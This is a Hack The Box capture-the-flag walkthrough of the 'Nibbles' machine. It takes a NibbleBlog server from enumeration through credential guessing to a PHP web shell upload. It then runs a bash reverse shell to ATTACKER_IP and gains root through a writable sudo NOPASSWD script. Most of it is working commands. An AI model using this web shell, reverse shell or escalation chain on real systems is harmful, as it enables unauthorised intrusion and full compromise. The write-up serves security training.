# Hack The Box – Nibbles


# 1. Enumeration

## Nmap Scan

```bash
nmap -p- -sV -sC -T4 -oN nibbles.txt nibbles.htb
```

### Results

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Only SSH and HTTP were exposed. The primary attack surface was the web service running on port 80.

---

# 2. Web Enumeration

## Initial Inspection

```bash
curl -s http://nibbles.htb
```

Reviewing the source revealed:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

This disclosed the hidden directory:

```
/nibbleblog/
```

---

## Accessing the Admin Panel

```bash
curl -i http://nibbles.htb/nibbleblog/admin.php
```

The login panel for NibbleBlog was identified.

---

# 3. Username Enumeration

The following file was accessible:

```bash
curl -s http://nibbles.htb/nibbleblog/content/private/users.xml
```

Output:

```xml
<username>admin</username>
```

A valid username was identified: **admin**

---

# 4. Authentication via curl

Login was performed using a crafted POST request:

```bash
curl -i -c cookies.txt -X POST \
-d "username=admin&password=nibbles" \
http://nibbles.htb/nibbleblog/admin.php
```

Server response:

```
HTTP/1.1 302 Found
Location: /nibbleblog/admin.php?controller=dashboard&action=view
Set-Cookie: PHPSESSID=...
```

The 302 redirect and session cookie confirmed successful authentication.

---

## Session Verification

```bash
curl -b cookies.txt \
http://nibbles.htb/nibbleblog/admin.php?controller=dashboard&action=view
```

The dashboard loaded, confirming a valid authenticated session.

---

# 5. Authenticated File Upload – Remote Code Execution

NibbleBlog provides an image upload feature via the `my_image` plugin.

## Create Web Shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

---

## Reconstruct Multipart POST Request

```bash
curl -b cookies.txt -X POST \
-F "plugin=my_image" \
-F "title=My image" \
-F "position=4" \
-F "caption=" \
-F "image=@shell.php" \
-F "image_resize=1" \
-F "image_width=230" \
-F "image_height=200" \
-F "image_option=auto" \
-F "save=Save changes" \
"http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
```

The upload succeeded. Directory indexing revealed that the file was renamed to:

```
/nibbleblog/content/private/plugins/my_image/image.php
```

---

## Confirm Remote Code Execution

```bash
curl "http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
```

Command execution was confirmed under the `nibbler` user.

---

# 6. Reverse Shell (Professional Handling with socat)

## Listener (Attacker Machine)

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Trigger Reverse Shell

```bash
curl -G \
--data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
"http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php"
```

An interactive shell was obtained as `nibbler`.

---

# 7. Privilege Escalation

## Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The specified script path did not exist, but the directory was writable by the current user.

---

## Exploit NOPASSWD Misconfiguration

```bash
mkdir -p /home/nibbler/personal/stuff
cd /home/nibbler/personal/stuff
echo '#!/bin/bash' > monitor.sh
echo '/bin/bash -p' >> monitor.sh
chmod +x monitor.sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
sudo ./monitor.sh
```

A root shell was obtained successfully.

---

# 8. Conclusion

This machine demonstrated several common yet critical vulnerabilities:

* Hidden directories exposed via source code comments
* Sensitive XML files leaking valid usernames
* Weak authentication credentials
* Authenticated file upload leading to remote code execution
* Directory indexing aiding exploitation
* Sudo misconfiguration allowing privilege escalation

---
